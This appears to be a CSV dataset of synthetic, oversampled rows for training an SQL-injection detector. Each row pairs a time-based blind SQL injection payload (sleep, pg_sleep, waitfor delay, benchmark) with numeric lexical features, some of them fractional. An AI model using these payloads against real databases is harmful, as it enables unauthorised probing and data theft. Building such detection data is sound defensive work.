id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000430,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.31819560088361515,39.37883220667694,15.884202300476925,2.940191331669509,10.999999999999998,0.8842023004769244,18.726225305246167,8.768404600953849,0.2844018479914667,0.02156590976772986,0.4699174285289558,0.22411481371184763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7684046009538488,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,1.0475549741972319,101.2602577913359,30.0,3.7279993503229796,30.62329036811068,18.0,41.26025779133591,11.376709631889318,0.30280305482554537,0.17790431551283825,0.4069856149572058,0.11230701470441054,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.376709631889319,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.6232903681106816,0.3767096318893184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000432,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.9584309926269418,62.19618249969551,19.742311785670786,3.2227807417262735,24.515376428658428,1.0,27.45387071402472,9.22693535701236,0.39590891212758966,0.01611946751653083,0.44033948278684554,0.14763213756903398,3.0,0.0,0.0,0.0,0.0,0.7423117856707868,0.0,4.742311785670787,0.0,0.7423117856707868,0.0,0.7423117856707868,1.0,0.0,0.0,0.0,0.0,0.7423117856707868,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2576882143292132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.257688214329213
SMOTE_000433,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.14133467237449482,32.29712069879882,23.024760058233234,4.366387687117272,16.0,2.0,2.2476005823323497,12.04952011646647,0.49662362842274066,0.062077953552842575,0.06770523951494145,0.37359317850947527,2.0,1.0,2.0,0.0,0.0,0.0,1.0000000000000002,0.04952011646646959,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.024760058233235127,1.0000000000000002,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000434,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,0.9914028713637731,58.28123479486269,25.640617397431345,3.7862443690624223,22.378463774923716,10.0,19.689231887461858,6.213539132477115,0.380180722380468,0.1753748331750875,0.33915896938905843,0.10528547505538605,0.7378463774923716,0.0,0.0,0.0,0.0,1.0,0.0,2.7378463774923714,0.0,0.0,0.0,1.7378463774923716,0.7378463774923716,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.7378463774923717,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.737846377492372
SMOTE_000435,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,0.7040359973909691,75.90407607093832,18.58404149323908,2.9753742044403726,26.58404149323908,1.2640069155398468,37.05602766215939,11.0,0.3494835497770703,0.01636797598882428,0.48867307253487535,0.14547540169923,0.0,0.0,2.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,0.2640069155398468,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.264006915539847
SMOTE_000436,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.8250235307241317,80.69658296569835,20.232194321899453,3.0466488445420237,27.928777287597807,2.0,39.23219432189945,11.535611356201095,0.34585759682740497,0.024790185853705307,0.4862061460978494,0.14314607122104026,0.7678056781005479,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.7678056781005478,0.0,0.0,1.0,0.7678056781005478,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000437,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,0.3598092901500217,58.600886359699146,19.680709087759315,3.074104401592114,11.239468184180513,9.281595447458457,28.079822728060172,10.0,0.1922532557783929,0.15744044814910782,0.47956205991336287,0.1707442361591364,0.0,1.1596454561203429,0.0,0.0,0.0,1.0,0.0,5.0,0.9999999999999999,0.0,0.9201772719398287,1.0,0.0,1.0,0.0,0.9201772719398287,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.07982272806017143,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0798227280601713
SMOTE_000438,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,0.033600798020564135,123.70093119838774,23.981308199899235,2.9923128858824253,38.971962299848855,1.9906540999496167,64.78504429884119,17.953270499748086,0.3152337840501521,0.016079877804784093,0.5235610944215554,0.14512524372350835,3.990654099949617,0.0,0.0,0.0,1.0,1.0,0.0,11.962616399798467,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.9906540999496172,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.990654099949618
SMOTE_000439,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.4127313105849757,34.667411765120086,22.916852941280023,4.285433638319631,16.0,2.0,4.75055882384007,11.916852941280023,0.4620473841088281,0.057755923013603515,0.13634331798046267,0.3438533748971057,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9168529412800233,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9168529412800231,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.0181313683243055,30.977658733860565,21.98212698708845,4.30777475734363,15.98212698708845,2.0089365064557736,2.0044682532278877,10.982126987088451,0.5158851077642345,0.06491527820398002,0.06474342231059971,0.3544561917211858,2.0044682532278872,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9821269870884506,0.9955317467721128,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000441,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,3.3558634288300264,64.66041595555593,23.23264007407345,3.552175487067187,21.44652801481469,10.0,24.874303896297167,8.339584044444072,0.33203514043075877,0.15473685436374235,0.38364896835017964,0.12957903685531919,1.8930560296293808,0.0,0.0,0.0,0.0,1.0,0.0,3.55347198518531,0.0,0.0,0.0,1.8930560296293808,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4465280148146904,0.4465280148146904,0.0,1.0,0.0,0.0,0.4465280148146904,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.893056029629381
SMOTE_000442,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.2018571477341624,98.9515275044848,30.09694499103039,3.7842845054952745,30.951527504484805,18.0,39.0,11.0,0.3127915759951522,0.18190811223657735,0.39413424317925094,0.11116606858901949,0.04847249551519517,0.9515275044848046,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.04847249551519539,0.9515275044848048,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.9515275044848046,0.048472495515195335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000443,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.6062894226013691,29.12252123539666,13.0,2.886556780087306,9.853753539232779,1.7075070784655528,13.122521235396661,4.43873938230167,0.339426935865301,0.05691690261551843,0.44716713856437024,0.1564890229548104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.853753539232777,0.0,0.5849858430688938,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000444,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.26158686440172463,29.35964432224133,16.0,3.35321234690214,10.999999999999998,0.0,10.287715457793059,8.071928864448266,0.3752980856545085,-1.3877787807814457e-17,0.34964229721458984,0.2750596171309017,0.0,1.0719288644482656,0.0,0.0,0.0,0.07192886444826552,0.0,1.9999999999999996,0.0,4.0,0.0,0.07192886444826585,0.0,1.0,0.0,0.9280711355517341,0.0,0.07192886444826563,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000445,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,1.895275031871243,46.291749790408815,19.715291631734804,3.485620349427634,15.934103974541419,3.642354184132598,17.3576458158674,9.357645815867402,0.33586039217188435,0.08104580095764279,0.37921577505709037,0.2038780318133825,3.072937447602205,0.0,1.2847083682651967,0.0,0.0,0.35764581586740163,0.0,2.6423541841325986,0.0,0.0,0.0,1.6423541841325984,1.0,0.0,0.6423541841325984,0.0,0.0,0.35764581586740163,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.35764581586740163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.357645815867402
SMOTE_000446,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.4735065668123564,60.72513463999773,20.182123622857468,3.035514095188983,13.0,10.817876377142532,28.907258262855198,8.0,0.2145376098768415,0.1782204851445343,0.47521876043902944,0.13202314453959477,0.0,0.1821236228574673,0.0,0.0,0.0,0.0,0.0,5.817876377142532,0.0,0.0,1.0,0.0,0.0,0.18212362285746722,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.9487618063278539,33.46618706505736,16.0,3.171433880992543,10.999999999999998,0.0,13.733093532528677,8.73309353252868,0.3289264175407804,-1.3877787807814457e-17,0.4102927952161508,0.2607807872430688,0.2669064674713214,1.4661870650573574,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,4.0,0.0,1.0,0.26690646747132135,0.7330935325286787,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000448,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4152251058545798,37.232395192749244,17.0,3.3560329948477876,13.0,0.1535209614501536,13.385916154199393,10.692958077099696,0.3500628887514034,0.00465215034697429,0.3583822018828449,0.2869027590187774,0.0,0.8464790385498481,2.0,0.0,0.0,0.0,0.0,2.846479038549848,0.0,5.0,0.0,2.0,0.0,0.8464790385498481,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000449,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,1.9615230428359378,81.44929990766296,21.652100277011105,3.048976732951334,28.0,2.0,40.34789972298889,11.10140018467407,0.3437849446831432,0.02455606747736737,0.4952811173085283,0.13637787053096118,0.0,0.5507000923370352,0.0,0.0,1.0,0.0,0.0,8.449299907662965,0.5507000923370352,0.0,0.0,1.0,0.0,0.5507000923370351,0.0,0.5507000923370351,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000450,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,0.8488034863293928,28.65222194377055,18.16576387148566,4.001212847467674,13.823402586342253,3.834236128514341,3.8288193574282943,7.165763871485659,0.47580751274693406,0.140184296306127,0.127832085587751,0.256176105359188,3.3315277429713186,0.0,1.6684722570286814,0.0,0.0,0.1657638714856592,0.0,0.0,0.0,0.0,0.0,1.8342361285143407,1.0,0.0,0.8342361285143407,0.0,0.0,0.1657638714856593,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.1657638714856593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1657638714856593
SMOTE_000451,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,1.511305835772277,51.749466849691586,17.12526657515421,2.879084345761405,13.437366712422895,1.5626332875771052,26.186833562114476,10.562633287577105,0.25967602465746453,0.030604715066471153,0.5049461013752318,0.20477315890083253,0.0,3.562633287577105,0.0,0.0,0.0,1.0,0.0,4.437366712422895,1.562633287577105,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.43736671242289515,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4373667124228953
SMOTE_000452,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,2.439279677158873,106.0763971411142,25.789799230299973,3.4124624636798706,39.24839934025712,5.872599010385683,46.33119912034283,14.62419967012856,0.37215387271771777,0.050866130417683175,0.4387676528320508,0.13821234403254817,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.541399890042854,0.0,0.0,0.0,2.5413998900428534,1.0,0.0,0.0,0.5413998900428534,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.5413998900428534,0.0,0.5413998900428536,1.0,0.4586001099571465,0.5413998900428535,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.082799780085708
SMOTE_000453,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.3834290254981483,23.509673627604634,12.754836813802319,3.132108499314419,8.673115751736427,0.16344212413178738,8.0,6.673115751736425,0.36705489674359365,0.009080118007321503,0.3424134513406548,0.28145153390843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,3.6731157517364257,0.0,0.0,0.0,0.0,0.0,0.9182789379341063,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000454,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.6549187036393121,32.65105850492393,23.130211700984788,4.365726813673434,16.0,2.0,2.520846803939147,12.130211700984788,0.49120191209562253,0.061400239011952816,0.07547717965895678,0.3719206692334679,2.0,1.0,2.0,0.0,0.0,0.0,1.0000000000000002,0.13021170098478674,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.13021170098478696,1.0000000000000002,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000455,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,0.20373685675036923,59.380596621722866,23.475745777153584,3.6511054119425204,21.380596621722866,10.0,21.90485084456928,6.0951491554307164,0.3598231562080896,0.16846759047155538,0.369118394982966,0.10259085833738905,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.095149155430717,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.09514915543071689,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.095149155430717
SMOTE_000456,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.7468415227995047,55.598734487700526,20.0,3.110104323201899,13.0,10.0,25.498945406417107,7.099789081283422,0.23660637392435366,0.18200490301873357,0.454156452044305,0.12723227101260773,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.099789081283422,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000457,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.22034589877270472,35.3790748637404,16.206975045419867,3.333479945486915,13.0,0.2069750454198651,12.379074863740403,9.793024954580135,0.36790574644055113,0.0062719710733292605,0.34908983322056336,0.27673244926555624,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.793024954580134,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000458,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.5915413777756401,53.460635861389264,17.988753103254076,3.3553152041561654,26.0,1.0,19.966259309762222,6.494376551627037,0.48842928687855414,0.01878574180302131,0.37139724766473464,0.12138772365368992,3.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4943765516270373,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000459,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,1.0414570241156549,93.10044979951974,26.244977510024015,3.650609888925074,25.265067469927963,19.530134939855927,35.79520240978388,12.510044979951974,0.2725490472613065,0.20890159318628543,0.3838452045757549,0.13470415497665317,3.755022489975987,0.0,0.0,0.0,0.0,1.7550224899759872,0.0,5.755022489975987,0.24497751002401272,0.0,1.0,1.7550224899759872,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.2449775100240129,0.0,0.0,0.0,1.0,0.7550224899759872,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,time,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,0.4681917244259124,92.65500779563007,18.586248051092483,2.737769261062303,27.78166406812331,2.0,50.45959177859925,12.41375194890752,0.30165794242101485,0.02164742985526187,0.5430495631957558,0.13364506452796746,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.41375194890752,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
